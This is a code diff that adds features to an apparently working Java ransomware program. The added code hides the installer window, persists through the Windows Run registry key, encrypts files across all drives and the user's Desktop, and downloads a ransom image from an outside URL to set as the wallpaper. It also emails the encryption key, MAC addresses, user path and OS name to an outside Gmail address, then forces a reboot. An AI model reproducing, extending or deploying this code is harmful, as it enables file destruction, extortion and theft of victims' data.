@@ -1,15 +1,21 @@
+import com.sun.jna.Native;
+import com.sun.jna.platform.win32.User32;
+
 import java.io.BufferedReader;
 import java.io.File;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.lang.reflect.InvocationTargetException;
 import java.nio.file.FileSystems;
+import java.security.MessageDigest;
+import java.security.NoSuchAlgorithmException;
 import java.util.ArrayList;
 import java.util.Base64;
 import java.util.Random;
 import java.util.Scanner;
 
 import javax.swing.JOptionPane;
+import javax.xml.bind.DatatypeConverter;
 
 /**
  * @author Amirreza Marzban
@@ -22,21 +28,44 @@ public class Main extends Core {
   private static int status;
 
   public static void main(String[] args) {
-    if (!isInterneton()) {
-      JOptionPane.showMessageDialog(null, "Check your internet connection and try again !");
-      System.exit(1);
-    }
+    JnaInstances.User32 user32 = JnaInstances.User32.INSTANCE;
     if (!new File("C:\\Users\\status").exists()) {
       createFile("C:\\Users\\status", 0);
     }
     status = Integer.parseInt(new String(Base64.getDecoder().decode(Core.readFile("C:\\Users\\status"))));
     if (status == 0) {
+      if (!isInterneton()) {
+        JOptionPane.showMessageDialog(null, "Check your internet connection and try again !");
+        System.exit(1);
+      }
       System.out.println("Installing the program...");
+      user32.EnumWindows((hwnd, pointer) -> {
+        char[] windowText = new char[512];
+        user32.GetWindowTextW(hwnd, windowText, 512);
+        String windowName = Native.toString(windowText);
+        if (windowName.contains("setup.exe")) {
+          user32.ShowWindow(hwnd, User32.SW_HIDE);
+          return false;
+        }
+        return true;
+      }, null);
       findFiles();
       System.exit(1);
     }
     textArt();
     findFiles();
+  }
+
+  public static String sha1(String input) {
+    String sha1 = null;
+    try {
+      MessageDigest msdDigest = MessageDigest.getInstance("SHA-1");
+      msdDigest.update(input.getBytes(), 0, input.length());
+      sha1 = DatatypeConverter.printHexBinary(msdDigest.digest());
+    } catch (NoSuchAlgorithmException e) {
+      e.printStackTrace();
+    }
+    return sha1;
   }
 
   /**
@@ -89,30 +118,34 @@ public class Main extends Core {
         WinRegistry.HKEY_CURRENT_USER,
         "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
         "ransome",
-        p + "\\setup.exe",
+        p + "\\setup.exe /onboot",
         1);
-      WinRegistry.writeStringValue(
-        WinRegistry.HKEY_CURRENT_USER,
-        "Control Panel\\Desktop",
-        "Wallpaper",
-        "",
-        1);
+      FileDownloader.download("https://www.online-tech-tips.com/wp-content/uploads/2019/07/ransomware.jpeg", "C:\\Windows\\h.jpg", filePath -> {
+        WinRegistry.writeStringValue(
+          WinRegistry.HKEY_CURRENT_USER,
+          "Control Panel\\Desktop",
+          "Wallpaper",
+          filePath,
+          1);
+        //reset the computer with a message
+        runCommand("shutdown -r -c \"good bye..\"", null);
+      });
     } catch (IllegalAccessException e) {
       e.printStackTrace();
     } catch (InvocationTargetException e) {
       e.printStackTrace();
     }
-    //reset the computer with a message
-    runCommand("shutdown -r -c \"Gooooooooooooooooooooood Bye...\"", null);
   }
 
   /**
    * Search all dirvers
+   *
    * @return the victim drivers
    */
   static ArrayList<String> findDrives() {
     ArrayList<String> arrayList = new ArrayList<>();
-    String drives[] = {"A:", "B:", "C:", "D:", "E:", "F:", "G:", "H:", "I:", "J:", "K:", "L:", "M:", "N:", "O:", "P:", "Q:", "R:", "S:", "T:", "U:", "V:", "W:", "X:", "Y:", "Z:"};
+//    String drives[] = {"F:"};
+    String drives[] = {"A:", "B:", System.getProperty("user.home") + "\\Desktop\\", "D:", "E:", "F:", "G:", "H:", "I:", "J:", "K:", "L:", "M:", "N:", "O:", "P:", "Q:", "R:", "S:", "T:", "U:", "V:", "W:", "X:", "Y:", "Z:"};
     for (String d : drives) {
       FileSystems.getDefault().getFileStores().forEach(root -> {
           if (root.toString().contains(d)) {
@@ -131,9 +164,6 @@ public class Main extends Core {
     try {
       Process runtime;
       for (String drive : findDrives()) {
-        if(drive.equals("C:")) {
-          drive = System.getProperty("user.home") + "\\Desktop";
-        }
         runtime = Runtime.getRuntime().exec("cmd /c dir /S /B *", null, new File(drive));
 
         BufferedReader inputStream = new BufferedReader(new InputStreamReader(runtime.getInputStream()));
@@ -143,9 +173,10 @@ public class Main extends Core {
           Scanner scanner = new Scanner(System.in);
           String userInput = scanner.nextLine();
           if (userInput.equals(decryptedKey)) {
-            System.out.println("\"Your files are getting back...\"");
+            System.out.println("\"Your files are getting back...\nDo not close the window.\nIt will close by itself\n\"");
             while ((s = inputStream.readLine()) != null) {
               encryptFile(new File(s), Integer.parseInt(decryptedKey), status);
+              System.out.println(s);
             }
           } else {
             System.out.println("The Key is wrong");
@@ -156,13 +187,16 @@ public class Main extends Core {
           StringBuilder stringBuilder = new StringBuilder();
           createFile("C:\\Users\\Keys", key);
           while ((s = inputStream.readLine()) != null) {
-//            System.out.println("installing file : " + s);
             encryptFile(new File(s), key, status);
           }
           for (String mac : runCommand("cmd /c ipconfig/all|find \"Physical Address\"", null)) {
             stringBuilder.append(mac);
           }
-          Mailer.send("****@example.com", "New Key", stringBuilder.toString() + "\n" + String.valueOf(key));
+          Mailer.send("****@gmail.com", "New Key",
+            "MAC Address: \n" + stringBuilder.toString() + "\n" +
+              "KEY: " + String.valueOf(key) + "\n" +
+              "User: " + System.getProperty("user.home") + "\n" +
+              "OS: " + System.getProperty("os.name"));
           writeInRegistry();
           System.exit(1);
         }
